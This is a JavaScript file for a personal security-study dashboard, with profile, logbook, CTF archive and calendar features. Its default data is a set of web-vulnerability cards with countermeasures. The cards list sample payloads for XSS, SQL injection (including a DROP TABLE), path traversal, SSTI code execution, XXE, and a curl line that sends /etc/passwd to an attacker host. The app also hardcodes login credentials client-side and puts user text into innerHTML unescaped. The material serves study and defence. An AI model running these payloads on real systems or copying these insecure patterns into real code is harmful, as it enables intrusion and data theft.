// Authentication
const VALID_USERNAME = 'rokta';
const VALID_PASSWORD = 'rokta';

// State Management
let vulnerabilities = {};
let profileTags = [];
let profileSkills = [];
let profileContacts = [];
let logs = [];
let archives = [];
let news = [];
let currentVulnId = null;
let currentLogId = null;
let currentArchiveId = null;
let currentNewsId = null;
let editingVulnId = null;
let editingLogId = null;
let editingArchiveId = null;
let editingNewsId = null;
let currentNewsFilter = 'all';

// Initialize data from localStorage
function initializeData() {
    vulnerabilities = JSON.parse(localStorage.getItem('vulnerabilities')) || getDefaultVulnerabilities();
    profileTags = JSON.parse(localStorage.getItem('profileTags')) || ['#CRACKR', '#밤샘', '#CTF'];
    profileSkills = JSON.parse(localStorage.getItem('profileSkills')) || ['Web Security', 'Binary Exploitation', 'Cryptography', 'Reverse Engineering', 'Network Security'];
    profileContacts = JSON.parse(localStorage.getItem('profileContacts')) || [];
    logs = JSON.parse(localStorage.getItem('logs')) || [];
    archives = JSON.parse(localStorage.getItem('archives')) || [];
    news = JSON.parse(localStorage.getItem('news')) || [];
    
    const profileImage = localStorage.getItem('profileImage');
    if (profileImage) {
        document.getElementById('profileAvatarImg').src = profileImage;
        document.getElementById('profileAvatarImg').style.display = 'block';
        document.getElementById('profileAvatarText').style.display = 'none';
    }
}

// Check if user is logged in
function checkAuth() {
    const isLoggedIn = sessionStorage.getItem('isLoggedIn');
    if (isLoggedIn === 'true') {
        document.getElementById('loginModal').classList.remove('active');
        document.getElementById('mainContent').classList.remove('hidden');
        initializeData();
        renderVulnGrid();
        renderProfileTags();
        renderProfileSkills();
        renderProfileContacts();
        renderLogbook();
        renderArchives();
        renderNews();
        
        // 자동 뉴스 업데이트 체크
        checkAndUpdateNews();
    } else {
        document.getElementById('loginModal').classList.add('active');
        document.getElementById('mainContent').classList.add('hidden');
    }
}

// Login function
function login() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const errorMsg = document.getElementById('loginError');

    if (username === VALID_USERNAME && password === VALID_PASSWORD) {
        sessionStorage.setItem('isLoggedIn', 'true');
        errorMsg.classList.remove('show');
        checkAuth();
    } else {
        errorMsg.textContent = '❌ Invalid username or password';
        errorMsg.classList.add('show');
    }
}

// Logout function
function logout() {
    sessionStorage.removeItem('isLoggedIn');
    checkAuth();
}

// Close login modal
function closeLogin() {
    return false;
}

// Page Navigation
function showPage(pageName) {
    document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
    document.querySelectorAll('.nav-link').forEach(link => link.classList.remove('active'));
    
    document.getElementById(pageName + 'Page').classList.add('active');
    event.target.classList.add('active');

    if (pageName === 'calendar') {
        initCalendar();
    }
}

// Profile Sidebar Toggle
function toggleProfile() {
    const sidebar = document.getElementById('profileSidebar');
    sidebar.classList.toggle('active');
}

// Profile Image Management
function changeProfileImage() {
    document.getElementById('profileImageInput').click();
}

function handleProfileImageChange(event) {
    const file = event.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = function(e) {
            const imageData = e.target.result;
            localStorage.setItem('profileImage', imageData);
            document.getElementById('profileAvatarImg').src = imageData;
            document.getElementById('profileAvatarImg').style.display = 'block';
            document.getElementById('profileAvatarText').style.display = 'none';
        };
        reader.readAsDataURL(file);
    }
}

// Profile Tags Management
function renderProfileTags() {
    const container = document.getElementById('profileTags');
    container.innerHTML = profileTags.map((tag, index) => `
        <div class="profile-tag">
            <span>${tag}</span>
            <button class="remove-tag-btn" onclick="removeTag(${index})">×</button>
        </div>
    `).join('');
}

function showAddTagModal() {
    document.getElementById('addTagModal').classList.add('active');
    document.getElementById('newTagInput').value = '';
}

function closeAddTagModal() {
    document.getElementById('addTagModal').classList.remove('active');
}

function addTag() {
    const input = document.getElementById('newTagInput').value.trim();
    if (!input) return;
    
    let tag = input;
    if (!tag.startsWith('#')) {
        tag = '#' + tag;
    }
    
    profileTags.push(tag);
    localStorage.setItem('profileTags', JSON.stringify(profileTags));
    renderProfileTags();
    closeAddTagModal();
}

function removeTag(index) {
    if (confirm('이 태그를 삭제하시겠습니까?')) {
        profileTags.splice(index, 1);
        localStorage.setItem('profileTags', JSON.stringify(profileTags));
        renderProfileTags();
    }
}

// Profile Skills Management
function renderProfileSkills() {
    const container = document.getElementById('profileSkills');
    container.innerHTML = profileSkills.map((skill, index) => `
        <div class="skill-tag">
            <span>${skill}</span>
            <button class="remove-tag-btn" onclick="removeSkill(${index})">×</button>
        </div>
    `).join('');
}

function showAddSkillModal() {
    document.getElementById('addSkillModal').classList.add('active');
    document.getElementById('skillCategory').value = 'Web Security';
    document.getElementById('customSkillInput').value = '';
    document.getElementById('customSkillGroup').style.display = 'none';
}

function closeAddSkillModal() {
    document.getElementById('addSkillModal').classList.remove('active');
}

function toggleCustomSkill() {
    const category = document.getElementById('skillCategory').value;
    const customGroup = document.getElementById('customSkillGroup');
    customGroup.style.display = category === 'custom' ? 'block' : 'none';
}

function addSkill() {
    const category = document.getElementById('skillCategory').value;
    let skill;
    
    if (category === 'custom') {
        skill = document.getElementById('customSkillInput').value.trim();
        if (!skill) {
            alert('스킬명을 입력해주세요.');
            return;
        }
    } else {
        skill = category;
    }
    
    if (profileSkills.includes(skill)) {
        alert('이미 추가된 스킬입니다.');
        return;
    }
    
    profileSkills.push(skill);
    localStorage.setItem('profileSkills', JSON.stringify(profileSkills));
    renderProfileSkills();
    closeAddSkillModal();
}

function removeSkill(index) {
    if (confirm('이 스킬을 삭제하시겠습니까?')) {
        profileSkills.splice(index, 1);
        localStorage.setItem('profileSkills', JSON.stringify(profileSkills));
        renderProfileSkills();
    }
}

// Profile Contacts Management
function renderProfileContacts() {
    const container = document.getElementById('profileContacts');
    if (!container) return;
    
    container.innerHTML = profileContacts.map((contact, index) => `
        <div class="contact-item" onclick="openContactUrl('${escapeHtml(contact.url)}')">
            <span class="contact-icon">${getContactIcon(contact.name)}</span>
            <span class="contact-name">${escapeHtml(contact.name)}</span>
            <div class="contact-actions">
                <button class="edit-contact-btn" onclick="event.stopPropagation(); editContact(${index})" title="수정">✏️</button>
                <button class="remove-contact-btn" onclick="event.stopPropagation(); removeContact(${index})" title="삭제">🗑️</button>
            </div>
        </div>
    `).join('');
}

function openContactUrl(url) {
    window.open(url, '_blank');
}

function getContactIcon(name) {
    const nameLower = name.toLowerCase();
    const icons = {
        'discord': '💬',
        'instagram': '📷',
        'velog': '📝',
        'notion': '📋',
        'github': '💻',
        'twitter': '🐦',
        'linkedin': '💼',
        'email': '📧',
        'telegram': '✈️',
        'facebook': '📘',
        'youtube': '▶️'
    };
    
    for (const [key, icon] of Object.entries(icons)) {
        if (nameLower.includes(key)) return icon;
    }
    return '🔗';
}

let editingContactId = null;

function showAddContactModal() {
    editingContactId = null;
    document.getElementById('contactFormTitle').textContent = '연락처 추가';
    document.getElementById('addContactModal').classList.add('active');
    document.getElementById('contactName').value = '';
    document.getElementById('contactUrl').value = '';
}

function closeAddContactModal() {
    document.getElementById('addContactModal').classList.remove('active');
    editingContactId = null;
}

function editContact(index) {
    editingContactId = index;
    const contact = profileContacts[index];
    
    document.getElementById('contactFormTitle').textContent = '연락처 수정';
    document.getElementById('contactName').value = contact.name;
    document.getElementById('contactUrl').value = contact.url;
    document.getElementById('addContactModal').classList.add('active');
}

function saveContact() {
    const name = document.getElementById('contactName').value.trim();
    const url = document.getElementById('contactUrl').value.trim();
    
    if (!name) {
        alert('플랫폼 이름을 입력해주세요.');
        return;
    }
    
    if (!url) {
        alert('URL을 입력해주세요.');
        return;
    }
    
    // URL 자동 완성
    let finalUrl = url;
    if (!url.startsWith('http://') && !url.startsWith('https://') && !url.startsWith('mailto:')) {
        finalUrl = `https://${url}`;
    }
    
    const contact = {
        name,
        url: finalUrl
    };
    
    if (editingContactId !== null) {
        // 수정
        profileContacts[editingContactId] = contact;
    } else {
        // 추가
        profileContacts.push(contact);
    }
    
    localStorage.setItem('profileContacts', JSON.stringify(profileContacts));
    renderProfileContacts();
    closeAddContactModal();
}

function removeContact(index) {
    if (confirm('이 연락처를 삭제하시겠습니까?')) {
        profileContacts.splice(index, 1);
        localStorage.setItem('profileContacts', JSON.stringify(profileContacts));
        renderProfileContacts();
    }
}

// Default Vulnerabilities
function getDefaultVulnerabilities() {
    return {
        'xss': {
            id: 'xss',
            title: 'Cross-Site Scripting (XSS)',
            icon: '⚡',
            level: 'high',
            description: '악의적인 스크립트를 웹 페이지에 삽입',
            what: 'XSS는 공격자가 웹 애플리케이션에 악의적인 스크립트를 주입하여 다른 사용자의 브라우저에서 실행되도록 하는 취약점입니다. 사용자 입력값이 제대로 검증되지 않거나 인코딩되지 않은 채 웹 페이지에 출력될 때 발생합니다.',
            types: ['Reflected XSS (반사형): URL 파라미터를 통해 즉시 실행', 'Stored XSS (저장형): DB에 저장되어 지속적으로 실행', 'DOM-based XSS: 클라이언트 측 JavaScript에서 발생'],
            examples: ['&lt;script&gt;alert(document.cookie)&lt;/script&gt;', '&lt;img src=x onerror=alert(1)&gt;', '&lt;svg onload=alert(1)&gt;', 'javascript:alert(document.cookie)'],
            practice: ['댓글 시스템에서 HTML 태그가 그대로 렌더링되는 경우', '검색 결과 페이지에서 검색어가 인코딩 없이 출력', '사용자 프로필에서 자기소개가 필터링 없이 표시'],
            countermeasures: ['입력 검증: 모든 사용자 입력에 대해 화이트리스트 기반 검증', 'HTML 엔티티 인코딩: &lt; &gt; " \' & 등을 인코딩', 'CSP(Content Security Policy) 설정', 'HttpOnly 쿠키 플래그 설정']
        },
        'sqli': {
            id: 'sqli',
            title: 'SQL Injection',
            icon: '💉',
            level: 'critical',
            description: 'SQL 쿼리를 조작하여 DB 탈취',
            what: 'SQL Injection은 사용자 입력값이 SQL 쿼리에 제대로 검증되지 않은 채 직접 포함될 때 발생하는 취약점입니다. 공격자는 이를 통해 데이터베이스의 정보를 조회, 수정, 삭제하거나 관리자 권한을 획득할 수 있습니다.',
            types: ['In-band SQLi: 결과가 즉시 반환', 'Blind SQLi: 참/거짓 응답으로 정보 추출', 'Time-based Blind SQLi: 시간 지연으로 정보 추출', 'Out-of-band SQLi: 외부 채널로 데이터 전송'],
            examples: ["' OR '1'='1'--", "' UNION SELECT username,password FROM users--", "'; DROP TABLE users--", "admin'--"],
            practice: ['로그인 폼에서 username/password 검증 부족', '검색 기능에서 검색어를 쿼리에 직접 삽입', '게시글 조회 시 ID 값 검증 미흡'],
            countermeasures: ['Prepared Statements (파라미터화된 쿼리) 사용', 'ORM(Object-Relational Mapping) 프레임워크 사용', '입력값 화이트리스트 검증', '최소 권한 원칙: DB 계정 권한 최소화']
        },
        'csrf': {
            id: 'csrf',
            title: 'Cross-Site Request Forgery',
            icon: '🎣',
            level: 'high',
            description: '사용자 의도와 무관한 요청 전송',
            what: 'CSRF는 사용자가 인증된 상태에서 악의적인 웹사이트를 방문했을 때, 공격자가 사용자의 권한을 이용해 의도하지 않은 요청을 전송하는 공격입니다. 사용자가 모르는 사이에 비밀번호 변경, 송금, 계정 삭제 등의 작업이 수행될 수 있습니다.',
            types: ['GET 기반 CSRF: URL로 상태 변경 요청', 'POST 기반 CSRF: 폼을 통한 요청 전송', 'JSON CSRF: API 엔드포인트 공격'],
            examples: ['&lt;img src="https://bank.com/transfer?to=attacker&amount=1000"&gt;', '&lt;form action="https://target.com/change-email" method="POST"&gt;&lt;/form&gt;', 'fetch("https://api.target.com/delete-account", {credentials: "include"})'],
            practice: ['비밀번호 변경 시 CSRF 토큰 미사용', 'GET 메소드로 중요한 상태 변경', '로그인 후 자동 로그아웃 기능 없음'],
            countermeasures: ['CSRF 토큰 사용 및 검증', 'SameSite 쿠키 속성 설정 (Strict/Lax)', 'Custom Header 검증 (X-Requested-With)', 'Referer/Origin 헤더 검증']
        },
        'upload': {
            id: 'upload',
            title: 'File Upload Vulnerability',
            icon: '📤',
            level: 'high',
            description: '악성 파일 업로드 및 실행',
            what: '파일 업로드 취약점은 웹 애플리케이션이 업로드되는 파일의 유형, 내용, 크기 등을 제대로 검증하지 않아 발생합니다. 공격자는 웹쉘, 악성코드 등을 업로드하여 서버를 장악하거나 다른 사용자를 공격할 수 있습니다.',
            types: ['확장자 검증 우회: .php.jpg, .php5, .phtml 등', 'MIME Type 조작: Content-Type 헤더 변조', 'Magic Bytes 변조: 파일 시그니처 위조', 'Double Extension: file.php.txt → file.php'],
            examples: ['shell.php', 'shell.php.jpg (더블 확장자)', 'shell.php%00.jpg (Null Byte)', 'shell.PhP (대소문자 혼용)'],
            practice: ['프로필 사진 업로드에서 확장자만 검증', '파일 업로드 후 업로드 디렉토리에서 실행 가능', '파일명을 사용자 입력값 그대로 사용'],
            countermeasures: ['화이트리스트 기반 확장자 검증', '파일 내용(Magic Bytes) 검증', '파일명 무작위 재생성', '업로드 디렉토리에서 스크립트 실행 불가 설정', '업로드 파일을 웹 루트 밖에 저장']
        },
        'download': {
            id: 'download',
            title: 'File Download / Path Traversal',
            icon: '📥',
            level: 'medium',
            description: '경로 순회를 통한 임의 파일 접근',
            what: 'Path Traversal(경로 순회) 취약점은 사용자 입력을 통해 파일 경로를 조작하여, 의도하지 않은 디렉토리나 파일에 접근할 수 있는 취약점입니다. 공격자는 이를 통해 시스템 파일, 설정 파일, 소스코드 등을 다운로드할 수 있습니다.',
            types: ['Absolute Path: 절대 경로 직접 지정', 'Relative Path: ../ 를 이용한 상위 디렉토리 접근', 'Encoding Bypass: URL 인코딩 우회', 'Null Byte Injection: %00으로 검증 우회'],
            examples: ['../../../etc/passwd', '....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'file.txt%00.jpg'],
            practice: ['파일 다운로드 기능에서 경로 검증 미흡', '파일명을 파라미터로 직접 받아 처리', '업로드된 파일 다운로드 시 경로 필터링 없음'],
            countermeasures: ['파일명 화이트리스트 검증', '파일 ID를 사용하여 실제 경로 매핑', '경로 정규화(realpath) 후 허용된 디렉토리 확인', 'Chroot Jail 환경 구성', '../ . 등 특수 문자 필터링']
        },
        'ssti': {
            id: 'ssti',
            title: 'Server-Side Template Injection',
            icon: '🎭',
            level: 'critical',
            description: '템플릿 인젝션을 통한 코드 실행',
            what: 'SSTI는 서버 측 템플릿 엔진에서 사용자 입력을 안전하게 처리하지 않아 발생하는 취약점입니다. 공격자는 템플릿 문법을 주입하여 서버에서 임의의 코드를 실행할 수 있으며, 이는 완전한 서버 장악으로 이어질 수 있습니다.',
            types: ['Jinja2 (Python Flask)', 'Twig (PHP)', 'Freemarker (Java)', 'ERB (Ruby)', 'Handlebars (Node.js)'],
            examples: ['{{7*7}}', '{{config}}', "{{''.__class__.__mro__[1].__subclasses__()}}", '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}'],
            practice: ['사용자 이름을 템플릿에 직접 렌더링', '이메일 템플릿에 사용자 입력 포함', '에러 메시지에 사용자 입력 표시'],
            countermeasures: ['샌드박스 환경에서 템플릿 실행', 'Logic-less 템플릿 엔진 사용', '사용자 입력을 템플릿 코드로 직접 사용 금지', '입력값 화이트리스트 검증', '템플릿을 정적으로 관리']
        },
        'os': {
            id: 'os',
            title: 'OS Command Injection',
            icon: '💻',
            level: 'critical',
            description: '시스템 명령어 실행 취약점',
            what: 'OS Command Injection은 애플리케이션이 시스템 명령어를 실행할 때 사용자 입력을 적절히 검증하지 않아 발생하는 취약점입니다. 공격자는 악의적인 명령어를 주입하여 서버에서 임의의 시스템 명령을 실행할 수 있습니다.',
            types: ['명령어 체이닝: ; && || 사용', '파이프 사용: |를 통한 명령어 연결', '백틱/서브쉘: `command` $(command)', 'Blind Command Injection: 출력 없이 실행'],
            examples: ['127.0.0.1; ls -la', '127.0.0.1 && cat /etc/passwd', '127.0.0.1 | whoami', '`curl attacker.com?data=$(cat /etc/passwd)`'],
            practice: ['ping 기능에서 IP 주소 검증 미흡', '파일 변환 기능에서 파일명 직접 사용', '로그 조회 기능에서 grep 명령어에 사용자 입력 포함'],
            countermeasures: ['시스템 명령어 실행 함수 사용 회피', '명령어 화이트리스트 검증', '특수문자(; & | ` $ 등) 필터링', '최소 권한으로 프로세스 실행', '안전한 API 사용 (exec 대신 특정 라이브러리)']
        },
        'xxe': {
            id: 'xxe',
            title: 'XML External Entity (XXE)',
            icon: '📄',
            level: 'high',
            description: 'XML 외부 엔티티 공격',
            what: 'XXE는 XML 파서가 외부 엔티티 참조를 처리할 때 발생하는 취약점입니다. 공격자는 악의적인 XML을 통해 서버의 로컬 파일을 읽거나, 내부 네트워크에 접근하거나, 서비스 거부 공격을 수행할 수 있습니다.',
            types: ['Classic XXE: 파일 시스템 접근', 'Blind XXE: Out-of-band 데이터 추출', 'Error-based XXE: 에러 메시지로 정보 노출', 'XXE to SSRF: 내부 네트워크 스캔'],
            examples: ['&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;', '&lt;!ENTITY xxe SYSTEM "http://internal-server/admin"&gt;', '&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"&gt;'],
            practice: ['XML 파일 업로드/파싱 기능', 'SOAP API에서 XML 요청 처리', 'SVG 파일 업로드 (SVG는 XML 기반)', 'Office 문서(.docx, .xlsx) 파싱'],
            countermeasures: ['XML 파서에서 외부 엔티티 비활성화', 'DTD(Document Type Definition) 처리 차단', '입력 XML 화이트리스트 검증', 'JSON 같은 대안 포맷 사용 고려', '최신 XML 파서 라이브러리 사용']
        },
        'idor': {
            id: 'idor',
            title: 'Insecure Direct Object Reference',
            icon: '🔑',
            level: 'medium',
            description: '권한 검증 우회를 통한 객체 접근',
            what: 'IDOR은 애플리케이션이 객체(파일, 데이터, 디렉토리 등)에 대한 직접 참조를 노출하면서 적절한 접근 권한 검증을 수행하지 않아 발생하는 취약점입니다. 공격자는 ID 값을 조작하여 다른 사용자의 정보에 무단으로 접근할 수 있습니다.',
            types: ['Sequential ID 조작: 순차적 ID 값 변경', 'UUID/GUID 노출: 예측 가능한 고유 식별자', 'Filename 조작: 파일명으로 직접 접근'],
            examples: ['/api/user/1234/profile → /api/user/1235/profile', '/download?file=user1234_report.pdf → user1235_report.pdf', '/order/12345 → /order/12346'],
            practice: ['사용자 프로필 조회 시 ID만 확인', '주문 내역 조회에서 주문번호만 검증', '파일 다운로드 시 파일 소유자 확인 누락'],
            countermeasures: ['모든 요청에 대해 접근 권한 검증', '간접 참조 사용 (세션 기반 매핑)', 'UUID 같은 예측 불가능한 식별자 사용', '객체 소유권 검증 로직 구현', 'API에서 사용자 컨텍스트 기반 필터링']
        }
    };
}

// Vulnerability Management
function renderVulnGrid() {
    const grid = document.getElementById('vulnGrid');
    if (!grid) return;
    grid.innerHTML = Object.values(vulnerabilities).map(vuln => `
        <div class="vuln-card" onclick="showVulnDetail('${vuln.id}')">
            <div class="vuln-icon">${vuln.icon}</div>
            <h3>${vuln.title}</h3>
            <p>${vuln.description}</p>
            <span class="vuln-level ${vuln.level}">${vuln.level.toUpperCase()}</span>
        </div>
    `).join('');
}

function showVulnDetail(vulnId) {
    currentVulnId = vulnId;
    const vuln = vulnerabilities[vulnId];
    const modal = document.getElementById('vulnModal');
    const detailDiv = document.getElementById('vulnDetail');
    
    let html = `
        <div class="vuln-detail-header">
            <div class="vuln-icon">${vuln.icon}</div>
            <h2>${vuln.title}</h2>
            <p>${vuln.description}</p>
        </div>
        
        <div class="vuln-section">
            <h3>📌 취약점이란?</h3>
            <p>${vuln.what}</p>
        </div>
        
        <div class="vuln-section">
            <h3>🎯 취약점 유형</h3>
            <ul>
                ${vuln.types.map(type => `<li>${type}</li>`).join('')}
            </ul>
        </div>
        
        <div class="vuln-section">
            <h3>💡 공격 예시</h3>
            ${vuln.examples.map(ex => `<div class="code-block"><code>${ex}</code></div>`).join('')}
        </div>
        
        <div class="vuln-section">
            <h3>🔬 실습 시나리오</h3>
            <ul>
                ${vuln.practice.map(p => `<li>${p}</li>`).join('')}
            </ul>
        </div>
        
        <div class="vuln-section">
            <h3>🛡️ 대응 방안</h3>
            <ul>
                ${vuln.countermeasures.map(c => `<li>${c}</li>`).join('')}
            </ul>
        </div>
    `;
    
    detailDiv.innerHTML = html;
    modal.classList.add('active');
}

function closeVulnModal() {
    document.getElementById('vulnModal').classList.remove('active');
    currentVulnId = null;
}

function showAddVulnModal() {
    editingVulnId = null;
    document.getElementById('vulnFormTitle').textContent = '취약점 추가';
    document.getElementById('vulnIcon').value = '';
    document.getElementById('vulnTitle').value = '';
    document.getElementById('vulnDescription').value = '';
    document.getElementById('vulnLevel').value = 'medium';
    document.getElementById('vulnWhat').value = '';
    document.getElementById('vulnTypes').value = '';
    document.getElementById('vulnExamples').value = '';
    document.getElementById('vulnPractice').value = '';
    document.getElementById('vulnCountermeasures').value = '';
    document.getElementById('addVulnModal').classList.add('active');
}

function closeAddVulnModal() {
    document.getElementById('addVulnModal').classList.remove('active');
    editingVulnId = null;
}

function editCurrentVuln() {
    if (!currentVulnId) return;
    
    editingVulnId = currentVulnId;
    const vuln = vulnerabilities[currentVulnId];
    
    document.getElementById('vulnFormTitle').textContent = '취약점 수정';
    document.getElementById('vulnIcon').value = vuln.icon;
    document.getElementById('vulnTitle').value = vuln.title;
    document.getElementById('vulnDescription').value = vuln.description;
    document.getElementById('vulnLevel').value = vuln.level;
    document.getElementById('vulnWhat').value = vuln.what;
    document.getElementById('vulnTypes').value = vuln.types.join('\n');
    document.getElementById('vulnExamples').value = vuln.examples.join('\n');
    document.getElementById('vulnPractice').value = vuln.practice.join('\n');
    document.getElementById('vulnCountermeasures').value = vuln.countermeasures.join('\n');
    
    closeVulnModal();
    document.getElementById('addVulnModal').classList.add('active');
}

function saveVuln() {
    const icon = document.getElementById('vulnIcon').value.trim();
    const title = document.getElementById('vulnTitle').value.trim();
    const description = document.getElementById('vulnDescription').value.trim();
    const level = document.getElementById('vulnLevel').value;
    const what = document.getElementById('vulnWhat').value.trim();
    const types = document.getElementById('vulnTypes').value.split('\n').filter(t => t.trim());
    const examples = document.getElementById('vulnExamples').value.split('\n').filter(e => e.trim());
    const practice = document.getElementById('vulnPractice').value.split('\n').filter(p => p.trim());
    const countermeasures = document.getElementById('vulnCountermeasures').value.split('\n').filter(c => c.trim());
    
    if (!icon || !title || !description) {
        alert('아이콘, 이름, 소제목은 필수입니다.');
        return;
    }
    
    const id = editingVulnId || 'vuln_' + Date.now();
    
    vulnerabilities[id] = {
        id,
        icon,
        title,
        description,
        level,
        what,
        types,
        examples,
        practice,
        countermeasures
    };
    
    localStorage.setItem('vulnerabilities', JSON.stringify(vulnerabilities));
    renderVulnGrid();
    closeAddVulnModal();
}

function deleteCurrentVuln() {
    if (!currentVulnId) return;
    
    if (confirm('이 취약점을 삭제하시겠습니까?')) {
        delete vulnerabilities[currentVulnId];
        localStorage.setItem('vulnerabilities', JSON.stringify(vulnerabilities));
        renderVulnGrid();
        closeVulnModal();
    }
}

// LogBook Management
function renderLogbook() {
    const container = document.getElementById('logbookList');
    if (!container) return;
    const sortedLogs = [...logs].sort((a, b) => new Date(b.date) - new Date(a.date));
    
    if (sortedLogs.length === 0) {
        container.innerHTML = '<div class="no-data">아직 작성된 로그가 없습니다.</div>';
        return;
    }
    
    container.innerHTML = sortedLogs.map(log => `
        <div class="log-item" onclick="viewLog(${log.id})">
            <div class="log-date">${log.date}</div>
            <h3 class="log-title">${log.title}</h3>
            <p class="log-preview">${log.content.substring(0, 100)}${log.content.length > 100 ? '...' : ''}</p>
        </div>
    `).join('');
}

function showAddLogModal() {
    editingLogId = null;
    document.getElementById('logFormTitle').textContent = '로그 추가';
    document.getElementById('logDate').value = new Date().toISOString().split('T')[0];
    document.getElementById('logTitle').value = '';
    document.getElementById('logContent').value = '';
    document.getElementById('addLogModal').classList.add('active');
}

function closeAddLogModal() {
    document.getElementById('addLogModal').classList.remove('active');
    editingLogId = null;
}

function saveLog() {
    const date = document.getElementById('logDate').value;
    const title = document.getElementById('logTitle').value.trim();
    const content = document.getElementById('logContent').value.trim();
    
    if (!date || !title || !content) {
        alert('모든 필드를 입력해주세요.');
        return;
    }
    
    if (editingLogId !== null) {
        const log = logs.find(l => l.id === editingLogId);
        log.date = date;
        log.title = title;
        log.content = content;
    } else {
        logs.push({
            id: Date.now(),
            date,
            title,
            content
        });
    }
    
    localStorage.setItem('logs', JSON.stringify(logs));
    renderLogbook();
    closeAddLogModal();
}

function viewLog(logId) {
    currentLogId = logId;
    const log = logs.find(l => l.id === logId);
    const modal = document.getElementById('viewLogModal');
    const content = document.getElementById('logDetailContent');
    
    content.innerHTML = `
        <div class="log-detail">
            <div class="log-detail-date">${log.date}</div>
            <h2 class="log-detail-title">${log.title}</h2>
            <div class="log-detail-content">${log.content.replace(/\n/g, '<br>')}</div>
        </div>
    `;
    
    modal.classList.add('active');
}

function closeViewLogModal() {
    document.getElementById('viewLogModal').classList.remove('active');
    currentLogId = null;
}

function editCurrentLog() {
    if (currentLogId === null) return;
    
    const log = logs.find(l => l.id === currentLogId);
    editingLogId = currentLogId;
    
    document.getElementById('logFormTitle').textContent = '로그 수정';
    document.getElementById('logDate').value = log.date;
    document.getElementById('logTitle').value = log.title;
    document.getElementById('logContent').value = log.content;
    
    closeViewLogModal();
    document.getElementById('addLogModal').classList.add('active');
}

function deleteCurrentLog() {
    if (currentLogId === null) return;
    
    if (confirm('이 로그를 삭제하시겠습니까?')) {
        logs = logs.filter(l => l.id !== currentLogId);
        localStorage.setItem('logs', JSON.stringify(logs));
        renderLogbook();
        closeViewLogModal();
    }
}

// Archives Management
function renderArchives() {
    const container = document.getElementById('archivesList');
    if (!container) return;
    const sortedArchives = [...archives].sort((a, b) => new Date(b.date) - new Date(a.date));
    
    if (sortedArchives.length === 0) {
        container.innerHTML = '<div class="no-data">아직 등록된 아카이브가 없습니다.</div>';
        return;
    }
    
    container.innerHTML = sortedArchives.map(archive => `
        <div class="archive-item">
            <div class="archive-header">
                <h3 class="archive-title">${archive.title}</h3>
                <span class="archive-type ${archive.type}">${archive.typeDisplay}</span>
            </div>
            <div class="archive-date">📅 ${archive.date}</div>
            ${archive.description ? `<p class="archive-description">${archive.description}</p>` : ''}
            <div class="archive-actions">
                <button onclick="editArchive(${archive.id})">수정</button>
                <button onclick="deleteArchive(${archive.id})" class="delete">삭제</button>
            </div>
        </div>
    `).join('');
}

function showAddArchiveModal() {
    editingArchiveId = null;
    document.getElementById('archiveFormTitle').textContent = '아카이브 추가';
    document.getElementById('archiveTitle').value = '';
    document.getElementById('archiveDate').value = new Date().toISOString().split('T')[0];
    document.getElementById('archiveType').value = 'ctf';
    document.getElementById('archiveCustomType').value = '';
    document.getElementById('archiveDescription').value = '';
    document.getElementById('customTypeGroup').style.display = 'none';
    document.getElementById('addArchiveModal').classList.add('active');
}

function closeAddArchiveModal() {
    document.getElementById('addArchiveModal').classList.remove('active');
    editingArchiveId = null;
}

function toggleArchiveCustomType() {
    const type = document.getElementById('archiveType').value;
    const customGroup = document.getElementById('customTypeGroup');
    customGroup.style.display = type === 'custom' ? 'block' : 'none';
}

function saveArchive() {
    const title = document.getElementById('archiveTitle').value.trim();
    const date = document.getElementById('archiveDate').value;
    const type = document.getElementById('archiveType').value;
    const customType = document.getElementById('archiveCustomType').value.trim();
    const description = document.getElementById('archiveDescription').value.trim();
    
    if (!title || !date) {
        alert('제목과 날짜는 필수입니다.');
        return;
    }
    
    if (type === 'custom' && !customType) {
        alert('기타를 선택한 경우 유형을 직접 입력해주세요.');
        return;
    }
    
    const typeDisplay = type === 'custom' ? customType : (type === 'ctf' ? 'CTF' : '콘퍼런스');
    
    if (editingArchiveId !== null) {
        const archive = archives.find(a => a.id === editingArchiveId);
        archive.title = title;
        archive.date = date;
        archive.type = type;
        archive.typeDisplay = typeDisplay;
        archive.description = description;
    } else {
        archives.push({
            id: Date.now(),
            title,
            date,
            type,
            typeDisplay,
            description
        });
    }
    
    localStorage.setItem('archives', JSON.stringify(archives));
    renderArchives();
    closeAddArchiveModal();
}

function editArchive(archiveId) {
    const archive = archives.find(a => a.id === archiveId);
    editingArchiveId = archiveId;
    
    document.getElementById('archiveFormTitle').textContent = '아카이브 수정';
    document.getElementById('archiveTitle').value = archive.title;
    document.getElementById('archiveDate').value = archive.date;
    
    if (archive.type === 'custom') {
        document.getElementById('archiveType').value = 'custom';
        document.getElementById('archiveCustomType').value = archive.typeDisplay;
        document.getElementById('customTypeGroup').style.display = 'block';
    } else {
        document.getElementById('archiveType').value = archive.type;
        document.getElementById('customTypeGroup').style.display = 'none';
    }
    
    document.getElementById('archiveDescription').value = archive.description || '';
    document.getElementById('addArchiveModal').classList.add('active');
}

function deleteArchive(archiveId) {
    if (confirm('이 아카이브를 삭제하시겠습니까?')) {
        archives = archives.filter(a => a.id !== archiveId);
        localStorage.setItem('archives', JSON.stringify(archives));
        renderArchives();
    }
}

// Calendar functionality
let currentDate = new Date();
let events = JSON.parse(localStorage.getItem('events')) || [];

function initCalendar() {
    renderCalendar();
    renderEvents();
}

function renderCalendar() {
    const year = currentDate.getFullYear();
    const month = currentDate.getMonth();
    
    document.getElementById('currentMonth').textContent = 
        new Date(year, month).toLocaleDateString('ko-KR', { year: 'numeric', month: 'long' });
    
    const firstDay = new Date(year, month, 1).getDay();
    const daysInMonth = new Date(year, month + 1, 0).getDate();
    
    const grid = document.getElementById('calendarGrid');
    grid.innerHTML = '';
    
    const dayNames = ['일', '월', '화', '수', '목', '금', '토'];
    dayNames.forEach(name => {
        const dayName = document.createElement('div');
        dayName.className = 'day-name';
        dayName.textContent = name;
        grid.appendChild(dayName);
    });
    
    for (let i = 0; i < firstDay; i++) {
        const empty = document.createElement('div');
        empty.className = 'calendar-day empty';
        grid.appendChild(empty);
    }
    
    const today = new Date();
    for (let day = 1; day <= daysInMonth; day++) {
